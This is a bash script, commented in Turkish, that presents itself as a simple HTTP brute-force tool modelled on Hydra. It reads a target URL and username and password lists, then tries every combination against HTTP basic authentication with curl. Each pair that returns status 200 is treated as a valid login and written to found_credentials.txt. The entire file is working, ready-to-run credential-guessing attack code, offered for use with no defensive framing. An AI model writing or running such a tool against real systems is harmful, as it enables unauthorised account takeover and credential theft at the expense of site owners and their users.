#!/bin/bash

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Banner
echo -e "${YELLOW}"
echo "  _    _           _       _____             _"
echo " | |  | |         | |     |  __ \           | |"
echo " | |__| |_   _  __| |_ __ | |__) |___  _   _| |_ ___"
echo " |  __  | | | |/ _\` | '_ \|  _  // _ \| | | | __/ _ \"
echo " | |  | | |_| | (_| | | | | | \ \ (_) | |_| | ||  __/"
echo " |_|  |_|\__,_|\__,_|_| |_|_|  \_\___/ \__,_|\__\___|"
echo -e "${NC}"
echo "Basit HTTP Brute-Force Aracı"
echo "Kullanım: ./hydra.sh -u <URL> -U <kullanıcı_listesi> -P <parola_listesi>"
echo ""

# Argümanları işle
while getopts "u:U:P:" opt; do
  case $opt in
    u) URL="$OPTARG"
    ;;
    U) USER_FILE="$OPTARG"
    ;;
    P) PASS_FILE="$OPTARG"
    ;;
    *) echo "Geçersiz seçenek: -$OPTARG" >&2
       exit 1
    ;;
  esac
done

# Gerekli argümanları kontrol et
if [ -z "$URL" ] || [ -z "$USER_FILE" ] || [ -z "$PASS_FILE" ]; then
    echo "Kullanım: $0 -u <URL> -U <kullanıcı_listesi> -P <parola_listesi>"
    exit 1
fi

# Dosyaların var olduğunu kontrol et
if [ ! -f "$USER_FILE" ]; then
    echo "Kullanıcı listesi dosyası bulunamadı: $USER_FILE"
    exit 1
fi

if [ ! -f "$PASS_FILE" ]; then
    echo "Parola listesi dosyası bulunamadı: $PASS_FILE"
    exit 1
fi

# İstatistikler
TOTAL_USERS=$(wc -l < "$USER_FILE")
TOTAL_PASSWORDS=$(wc -l < "$PASS_FILE")
TOTAL_ATTEMPTS=$((TOTAL_USERS * TOTAL_PASSWORDS))
ATTEMPT=0
FOUND=0

echo -e "${YELLOW}[*] Saldırı başlatılıyor...${NC}"
echo "[*] Hedef: $URL"
echo "[*] Kullanıcı sayısı: $TOTAL_USERS"
echo "[*] Parola sayısı: $TOTAL_PASSWORDS"
echo "[*] Toplam deneme: $TOTAL_ATTEMPTS"
echo ""

START_TIME=$(date +%s)

# Brute-force döngüsü
while IFS= read -r user; do
    while IFS= read -r pass; do
        ATTEMPT=$((ATTEMPT + 1))
        
        # İlerlemeyi göster
        if (( ATTEMPT % 100 == 0 )); then
            PERCENTAGE=$((ATTEMPT * 100 / TOTAL_ATTEMPTS))
            echo -ne "[*] İlerleme: $ATTEMPT/$TOTAL_ATTEMPTS ($PERCENTAGE%) - $FOUND bulundu\r"
        fi
        
        # HTTP isteği gönder
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "$URL")
        
        # Başarılı giriş kontrolü
        if [ "$RESPONSE" -eq 200 ]; then
            echo -e "${GREEN}[+] Başarılı giriş!${NC} Kullanıcı: $user - Parola: $pass"
            FOUND=$((FOUND + 1))
            # Bulunanları dosyaya yaz
            echo "$user:$pass" >> found_credentials.txt
        fi
        
    done < "$PASS_FILE"
done < "$USER_FILE"

END_TIME=$(date +%s)
ELAPSED_TIME=$((END_TIME - START_TIME))

echo -e "\n${YELLOW}[*] Saldırı tamamlandı${NC}"
echo "[*] Geçen süre: $ELAPSED_TIME saniye"
echo "[*] Toplam deneme: $ATTEMPT"
echo "[*] Bulunan kimlik bilgisi: $FOUND"
echo "[*] Bulunanlar 'found_credentials.txt' dosyasına kaydedildi"

if [ "$FOUND" -eq 0 ]; then
    echo -e "${RED}[-] Hiçbir kimlik bilgisi bulunamadı${NC}"
fi
